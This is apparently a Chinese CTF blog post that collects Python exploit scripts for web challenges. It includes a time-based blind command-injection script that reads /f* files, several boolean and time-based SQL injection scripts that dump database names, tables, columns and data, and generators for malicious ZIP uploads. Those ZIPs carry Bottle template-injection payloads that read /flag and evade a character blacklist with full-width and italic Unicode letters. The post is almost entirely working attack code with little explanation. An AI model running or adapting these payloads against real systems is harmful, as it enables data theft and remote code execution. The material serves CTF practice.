---
title: "web脚本"
date: 2025-12-11 14:57:08
categories: "WEB"
tags:
  - "WEB"
cover: /img/backgrounds/bg-16.png
top_img: /img/backgrounds/bg-16.png
disableNunjucks: true
---

# WEB
### 无参rce
使用sleep(2)进行测试

```arkts
import requests
import time

obtain = 'abcdefghijklmnopqrstuvwxyz1234567890{}-_,.'
result=""
for i in range(1,100):
    for n in obtain:
        payload = f"sleep $(cat /f* | cut -c {i} | tr {n} 2.5)"
        url="http://47.105.113.86:40005/"
        data={"cmd":payload}
        start = int(time.time())
        res=requests.post(url=url,data=data)
        end = int(time.time())
        padding = end - start
        if res.status_code == 200 and padding >= 2:
            result=result+n
            print(result)
```

### 速算
```plain
import requests
import re

req = requests.session()
url = "http://gz.imxbt.cn:20280/"

answer = 0
while True:
    response = req.post(url , data={"value": answer})
    print(response.text)
    if "BaseCTF" in response.text:
        print(response.text)
        break
    if "CTF" in response.text:
        print(response.text)
        break
    if "flag" in response.text:
        print(response.text)
        break
    regex = r" (\d*?)(.)(\d*)\?"
    match = re.search(regex, response.text)
    if match.group(2) == "+":
        answer = int(match.group(1)) + int(match.group(3))
    elif match.group(2) == "-":
        answer = int(match.group(1)) - int(match.group(3))
    elif match.group(2) == "×":
        answer = int(match.group(1)) * int(match.group(3))
    elif match.group(2) == "÷":
        answer = int(match.group(1)) // int(match.group(3))
```



```arkts
import requests
from bs4 import BeautifulSoup

# 设置目标 URL
url = 'http://challenge.qsnctf.com:30646/'

# 创建一个会话对象来保持请求的状态
s = requests.Session()

# 向服务器发送 POST 请求，开始会话
r = s.get(url=url)

# 遍历进行 31 次计算（如果页面结构相同）
for i in range(31):
    # 解析网页内容
    soup = BeautifulSoup(r.text, 'html.parser')

    # 提取挑战的算式
    challenge = soup.find('div', class_='challenge').text.strip()

    # 计算算式的结果
    ans = eval(challenge)  # 使用 eval 计算算式

    # 准备提交的答案数据
    data = {'value': ans}

    # 发送包含答案的 POST 请求
    r = s.post(url=url, data=data)

    # 输出每次提交的响应内容
    print(r.text)
```

### 布尔盲注
 爆破数据库长度  

```bash
import requests
import urllib.parse

# 目标地址
base_url = "http://127.0.0.1:29486/"

# 布尔成立时页面包含的字符串
success_flag = "Welcome admin"

def send_payload(condition):
    payload_username = f"admin' and ({condition}) and 1=1#"
    payload_password = "2"
    params = {
        "username": payload_username,
        "password": payload_password
    }
    full_url = base_url + "?" + urllib.parse.urlencode(params)
    r = requests.get(full_url)
    return success_flag in r.text

def get_db_length(max_len=50):
    print("[*] 开始爆破数据库长度...")
    for length in range(1, max_len + 1):
        condition = f"length(database())={length}"
        if send_payload(condition):
            print(f"[✔] 数据库长度: {length}")
            return length
    print("[!] 未找到数据库长度")
    return None

if __name__ == "__main__":
    db_length = get_db_length()

```

 爆破名字  

```bash
import requests
import urllib.parse

# 目标地址
base_url = "http://127.0.0.1:29486/"
success_flag = "Welcome admin"

def send_payload(condition):
    payload_username = f"admin' and ({condition}) and 1=1#"
    payload_password = "2"
    params = {
        "username": payload_username,
        "password": payload_password
    }
    full_url = base_url + "?" + urllib.parse.urlencode(params)
    r = requests.get(full_url)
    return success_flag in r.text

def get_char_ascii(pos):
    low, high = 32, 126  # 常见可打印字符范围
    while low <= high:
        mid = (low + high) // 2
        condition = f"(select ascii(substr(database(),{pos},1)))>{mid}"
        if send_payload(condition):
            low = mid + 1
        else:
            condition_eq = f"(select ascii(substr(database(),{pos},1)))={mid}"
            if send_payload(condition_eq):
                return mid
            else:
                high = mid - 1
    return None

def get_db_name(db_length):
    name = ""
    for pos in range(1, db_length + 1):
        ascii_code = get_char_ascii(pos)
        if ascii_code:
            name += chr(ascii_code)
            print(f"[+] 位置 {pos} 字符: {chr(ascii_code)}")
        else:
            name += "?"
    return name

if __name__ == "__main__":
    db_length = 4
    print("[*] 开始爆破数据库名...")
    db_name = get_db_name(db_length)
    print(f"[✔] 数据库名: {db_name}")

```

 爆表  

```bash
import requests
import urllib.parse

base_url = "http://127.0.0.1:29486/"
success_flag = "Welcome admin"

def send_payload(condition):
    payload_username = f"admin' and ({condition}) and 1=1#"
    payload_password = "2"
    params = {
        "username": payload_username,
        "password": payload_password
    }
    full_url = base_url + "?" + urllib.parse.urlencode(params)
    r = requests.get(full_url)
    return success_flag in r.text

def get_length(sql_expression, max_len=50):
    print("[*] 爆破长度中...")
    for length in range(1, max_len + 1):
        condition = f"length(({sql_expression}))={length}"
        if send_payload(condition):
            print(f"[✔] 长度为: {length}")
            return length
    print("[!] 长度爆破失败")
    return None

def get_char_at(sql_expression, pos):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        condition = f"(select ascii(substr(({sql_expression}),{pos},1)))>{mid}"
        if send_payload(condition):
            low = mid + 1
        else:
            condition_eq = f"(select ascii(substr(({sql_expression}),{pos},1)))={mid}"
            if send_payload(condition_eq):
                return mid
            else:
                high = mid - 1
    return None

def get_string(sql_expression, length):
    result = ""
    for pos in range(1, length + 1):
        ascii_code = get_char_at(sql_expression, pos)
        if ascii_code:
            result += chr(ascii_code)
            print(f"[+] 位置 {pos}: {chr(ascii_code)}")
        else:
            result += "?"
    return result

if __name__ == "__main__":
    # 爆破第一个表名
    table_sql = "select table_name from information_schema.tables where table_schema=database() limit 0,1"
    length = get_length(table_sql)
    if length:
        table_name = get_string(table_sql, length)
        print(f"[✔] 第一个表名: {table_name}")
    else:
        print("[✘] 爆破表名长度失败")

```

 爆字段  

```bash
import requests
import urllib.parse

base_url = "http://127.0.0.1:29486/"
success_flag = "Welcome admin"

def send_payload(condition):
    payload_username = f"admin' and ({condition}) and 1=1#"
    payload_password = "2"
    params = {
        "username": payload_username,
        "password": payload_password
    }
    full_url = base_url + "?" + urllib.parse.urlencode(params)
    r = requests.get(full_url)
    return success_flag in r.text

def get_length(sql_expression, max_len=50):
    for length in range(1, max_len + 1):
        condition = f"length(({sql_expression}))={length}"
        if send_payload(condition):
            return length
    return None

def get_char_at(sql_expression, pos):
    low, high = 32, 126
    while low <= high:
        mid = (low + high) // 2
        condition = f"(select ascii(substr(({sql_expression}),{pos},1)))>{mid}"
        if send_payload(condition):
            low = mid + 1
        else:
            condition_eq = f"(select ascii(substr(({sql_expression}),{pos},1)))={mid}"
            if send_payload(condition_eq):
                return mid
            else:
                high = mid - 1
    return None

def get_string(sql_expression, length):
    result = ""
    for pos in range(1, length + 1):
        ascii_code = get_char_at(sql_expression, pos)
        if ascii_code:
            result += chr(ascii_code)
            print(f"[+] 位置 {pos}: {chr(ascii_code)}")
        else:
            result += "?"
    return result

if __name__ == "__main__":
    # 先爆第一个表名
    table_sql = "select table_name from information_schema.tables where table_schema=database() limit 0,1"
    table_len = get_length(table_sql)
    if not table_len:
        print("[✘] 爆表名长度失败")
        exit()
    table_name = get_string(table_sql, table_len)
    print(f"[✔] 爆表名: {table_name}")

    # 爆字段名（第一个字段）
    column_sql = f"select column_name from information_schema.columns where table_name='{table_name}' limit 0,1"
    column_len = get_length(column_sql)
    if not column_len:
        print("[✘] 爆字段名长度失败")
        exit()
    column_name = get_string(column_sql, column_len)
    print(f"[✔] 爆字段名: {column_name}")

    # 爆字段内容（第一个字段第一条数据）
    data_sql = f"select {column_name} from {table_name} limit 0,1"
    data_len = get_length(data_sql)
    if not data_len:
        print("[✘] 爆字段内容长度失败")
        exit()
    data_value = get_string(data_sql, data_len)
    print(f"[✔] 爆字段内容: {data_value}")

```



```plain
import time
import requests

dicts='{0123456789qwertyuiopasdfghjklzxcvbnm-_,}'

flag = ''

for i in range(1,64):
    for s in dicts:
        #payload = 'select group_concat(table_name) from information_schema.tables where table_schema=database()'
        #payload = 'select group_concat(column_name) from information_schema.columns where table_name=\'ctfshow_fl0g\' and table_schema=database()'
        payload = 'select f1ag from ctfshow_fl0g'
        t_payload = 'admin\' and if(substr(({}),{},1)=\'{}\',1,0)#'.format(payload,i,s)
        res = requests.post('http://3094f582-d700-4861-bdb7-ad89b2b8efc0.challenge.ctf.show/api/index.php',data={'username':t_payload,'password':'1'})
        if res.text.find('5bc6') != -1:
            flag += s
            print(flag)
            time.sleep(2)
            break
```

### 半角转换
```plain
import zipfile
import os
import tempfile
import argparse

# --------------------------
# 和目标系统完全一致的黑名单（必须和原代码保持同步）
# --------------------------
BLACKLIST = [
    "b", "c", "d", "e", "h", "i", "j", "k", "m", "n", "o", "p",
    "q", "r", "s", "t", "u", "v", "w", "x", "y", "z",
    "%", ";", ",", "<", ">", ":", "?"
]

def half_to_full(text):
    """
    仅对黑名单中的字符进行半角→全角转换，其余字符保持不变
    :param text: 输入的半角文本（如 'open('/custom/flag').read()'）
    :return: 针对性转换后的文本（仅黑名单字符转全角）
    """
    full_text = []
    for char in text:
        # 只转换：小写字母且在黑名单中（原代码检测时会转小写，所以只处理小写即可）
        if char.lower() in BLACKLIST and char.islower():
            # 半角→全角：Unicode偏移 0xFEE0
            full_char = chr(ord(char) + 0xFEE0)
            full_text.append(full_char)
        else:
            # 非黑名单字符（如 a、f、g、l 等）保持半角不变
            full_text.append(char)
    return ''.join(full_text)

def generate_malicious_zip(flag_path="/flag", output_zip="malicious_flag.zip"):
    """
    生成针对性转换的恶意ZIP文件（仅黑名单字符转全角，支持自定义flag路径）
    :param flag_path: 目标flag路径（如 '/custom/flag'）
    :param output_zip: 输出ZIP文件名
    """
    # 1. 输入半角恶意代码（动态拼接flag路径）
    half_width_code = f"open('{flag_path}').read()"
    # 2. 仅对黑名单字符进行全角转换（精准绕过）
    full_width_code = half_to_full(half_width_code)
    # 3. 拼接为Bottle模板注入格式（{{ 代码 }}）
    malicious_content = f"{{{{{full_width_code}}}}}"

    # 打印转换详情（方便验证哪些字符被转换）
    print(f"🔍 转换详情（仅黑名单字符转全角）：")
    print(f"   原黑名单：{BLACKLIST}")
    print(f"   半角代码：{half_width_code}")
    print(f"   转换后：{full_width_code}")
    print(f"   最终注入代码：{malicious_content}")

    # 创建临时文件（自动清理，无残留）
    with tempfile.NamedTemporaryFile(mode='w', encoding='utf-8', suffix='.txt', delete=False) as temp_file:
        temp_file.write(malicious_content)
        temp_file_path = temp_file.name

    try:
        # 打包为ZIP（恶意文件放根目录，命名为flag.txt，避免路径问题）
        with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as zipf:
            zipf.write(temp_file_path, arcname="flag.txt")

        print(f"\n✅ ZIP文件生成成功！")
        print(f"📁 保存路径：{os.path.abspath(output_zip)}")
        print(f"🎯 目标flag路径：{flag_path}")
        print(f"📄 ZIP内文件：flag.txt（UTF-8编码）")

    finally:
        # 清理临时文件
        if os.path.exists(temp_file_path):
            os.remove(temp_file_path)
            print(f"🗑️  临时文件已清理")

if __name__ == "__main__":
    # 支持命令行参数（自定义flag路径和输出文件名）
    parser = argparse.ArgumentParser(description="生成针对性全角转换的恶意ZIP文件（仅黑名单字符转换）")
    parser.add_argument(
        "--flag-path",
        default="/flag",
        help="自定义flag路径（如 --flag-path /custom/flag）"
    )
    parser.add_argument(
        "--output",
        default="malicious_flag.zip",
        help="输出ZIP文件名（如 --output my_exp.zip）"
    )
    args = parser.parse_args()

    # 运行生成函数
    generate_malicious_zip(flag_path=args.flag_path, output_zip=args.output)
```

### unicode编码（斜体字）
```plain
import zipfile
import os

# 1. 定义我们需要的 Unicode 字符
# 对应 open
u_o = "\U0001D45C" # 𝑜
u_p = "\U0001D45D" # 𝑝
u_e = "\U0001D452" # 𝑒
u_n = "\U0001D45B" # 𝑛

# 对应 read
u_r = "\U0001D45F" # 𝑟
# e 已经有了
u_a = "\U0001D44E" # 𝑎 (虽然 a 是允许的，但用 unicode 保持一致也没问题，或者直接用 ascii a 也可以)
u_d = "\U0001D451" # 𝑑

# 2. 拼接 Payload
# 目标: {{ open('/flag').read() }}
# 注意: '/flag' 中的 f,l,a,g, / 都是允许字符，无需 Unicode 混淆
payload_code = f"{u_o}{u_p}{u_e}{u_n}('/flag').{u_r}{u_e}a{u_d}()"
full_payload = "{{" + payload_code + "}}"

print(f"Generated Payload Content: {full_payload}")

# 3. 创建 ZIP 文件
filename = "exploit.txt"
zip_name = "payload.zip"

with zipfile.ZipFile(zip_name, 'w') as zf:
    zf.writestr(filename, full_payload)

print(f"[*] {zip_name} 已生成。请上传此文件。")
```

